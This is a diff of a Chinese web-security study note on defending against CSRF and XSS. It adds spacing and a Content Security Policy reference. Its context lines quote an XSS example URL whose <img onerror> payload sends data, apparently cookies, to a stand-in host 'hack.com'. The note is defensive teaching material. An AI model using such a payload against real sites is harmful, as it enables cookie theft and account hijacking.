@@ -702,8 +702,13 @@ CSRF跨站点请求伪造(Cross—Site Request Forgery)
 ### 防御CSRF攻击：
 
 * 验证 HTTP Referer 字段；
+
 * 在请求地址中添加 token 并验证
+
 * 在 HTTP 头中自定义属性并验证。
+
+  
+
 
 
 **验证 HTTP Referer 字段**：
@@ -791,8 +796,6 @@ https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=
 
 ### XSS的防范措施：
 
-
-
 **编码:**
 对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。
 
@@ -821,7 +824,13 @@ https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=
 
 
 
+----
 
+**使用网页安全政策（Content Security Policy）**
+
+> Content Security Policy
+>
+> http://www.ruanyifeng.com/blog/2016/09/csp.html
 
 
 
